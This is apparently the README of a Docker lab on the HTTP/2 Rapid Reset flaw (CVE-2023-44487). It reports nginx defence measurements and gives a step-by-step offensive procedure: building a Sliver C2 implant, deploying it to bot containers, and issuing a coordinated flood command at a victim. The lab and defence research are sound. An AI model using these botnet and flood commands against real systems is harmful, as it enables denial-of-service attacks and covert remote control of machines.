# lab-results — experiments, data and report

Proof of work for the HTTP/2 Rapid Reset lab (CVE-2023-44487): measurement
scripts, raw data, chart-report and offensive procedure controlled via
C2 (Sliver). Everything is reproducible on a more powerful machine — see below.

## Structure

```
lab-results/
  scripts/      portable scripts to run on any machine
    run-botnet-matrix.sh      matrix: botnet size × 4 server configurations
  data/         raw results (CSV) + scenario timelines
    results.csv            1-sec measurement, defensive experiment (h2load, 5 thresholds)
    stats.csv             status distribution (2xx/429) per scenario
    botnet.csv            botnet matrix: victim CPU by botnet size × configuration
    attackers.txt         attacker-side statistics (h2load + Rapid Reset bot)
    timeline.txt          exact scenario timestamps (for Zabbix screenshots)
  report/
    raport.html           interactive report-dashboard (open in browser)
  as-run/       raw scripts exactly as executed in the session (proof-of-work;
                contain paths specific to the author's machine — for reference, not for running)
```

Change in `monitoring/provision.py` and `monitoring/alerts.py`: Zabbix API
timeout raised from 15→120 s (heavy `host.create` with a large template was
failing on a slow host).

## Two experiment tracks

### 1. Defensive / monitoring (completed, with report)
HTTP/2 flood attack (`h2load`) on the victim at 5 load thresholds (~10/20/40/55/80% CPU),
**with and without defense** (per-IP rate-limiting). Direct measurement every 1 s + Zabbix monitoring.
Results and conclusions: `report/raport.html` (+ `data/results.csv`, `data/stats.csv`).

Key finding: hardened mode keeps victim CPU at ~2% at every intensity level
(flood rejected with 429 at the edge), and the authentic Rapid Reset (bot) sent
~562k `RST_STREAM` with 0 successful responses — the nginx patch in action.

### 2. Offensive / botnet controlled via C2 (this directory)
Bot fleet (separate containers = separate IPs) launches **authentic Rapid Reset**
against the victim; load scaled by **botnet size** (1→5) for 4 configurations:
unpatched/patched nginx × with/without hardening. Data: `data/botnet.csv`.

## How to reproduce the botnet matrix (powerful machine)

```bash
# 1. Bring up the base lab (labnet network + loadgen + bot image + c2/Sliver)
docker compose up -d --build

# 2. Run the matrix. On a powerful CPU, raise limits so the fleet actually loads the victim:
BOT_CPUS=1.0 VIC_CPUS=2.0 CONC=800 bash lab-results/scripts/run-botnet-matrix.sh
```

The script will build victim images (`labvic:old` = nginx 1.25.1, `labvic:new` = 1.27),
deploy fleet `lab-bot1..5` (separate IPs), iterate through 4 configurations × sizes 1..5
and save `data/botnet.csv` + print a CPU table. Parameters (environment variables)
are described in the script header.

> Note on magnitude: Rapid Reset is **cheap for nginx to handle** (cancelled
> streams), so on a weak host (4 cores) the fleet doesn't saturate the victim and results
> are low/noisy — this is in itself a finding (nginx is resilient). On a machine with more
> cores (and higher `BOT_CPUS`) the CPU vs botnet size curve is higher and cleaner.

## C2 phase — attack controlled via Sliver (procedure)

The fleet is ready for C2 control. The Sliver server binary is in the
`c2` container (`/opt/sliver/sliver-server`, mounted from `c2/bin/`). Demonstration of
"state-of-the-art botnet C2":

```bash
# Sliver console
docker compose exec c2 /opt/sliver/sliver-server
```
In the console (mTLS = mutual TLS, default channel):
```
mtls --lport 8888                               # listener for implants
generate --mtls lab-c2:8888 --os linux --arch amd64 \
         --skip-symbols --save /root/.sliver/implant     # build implant (linux)
```
The implant will appear in `c2/data/implant` (mounted). Deploy it to bots and run
(each bot already has `rapidreset`):
```bash
for i in 1 2 3 4 5; do
  docker cp c2/data/implant lab-bot$i:/implant
  docker exec -d lab-bot$i /implant               # implant beacons to c2 (mTLS)
done
```
In the Sliver console the bots will register as sessions:
```
sessions                                          # 5 implants from different IPs
interact <ID>
execute /usr/local/bin/rapidreset -url https://victim:443 -requests 20000 -concurrency 1000
```
The `execute` command launches Rapid Reset on a bot **from the C2 level**. Repeat on
subsequent sessions (or script it) so the entire fleet strikes simultaneously — a screenshot
of the session list + commands = proof of botnet control. Observe the effect in Zabbix
(Monitoring → Latest data: Nginx Connections active / CPU) or directly
(`docker exec lab-victim2 ...`).

> Exact flags may vary between Sliver versions — `help generate`, `help mtls`
> in the console. Implants are linux/amd64 and run in bot containers (alpine).

## Zabbix monitoring

```bash
docker compose -f docker-compose.yml -f docker-compose.override.yml \
  -f docker-compose.monitoring.yml up -d --build zabbix-db zabbix-server zabbix-web
docker compose -f docker-compose.yml -f docker-compose.override.yml \
  -f docker-compose.monitoring.yml run --rm zabbix-provision   # host victim + templates
```
Frontend: http://localhost:8080 (Admin / zabbix). Details: `README-MONITORING.md`.
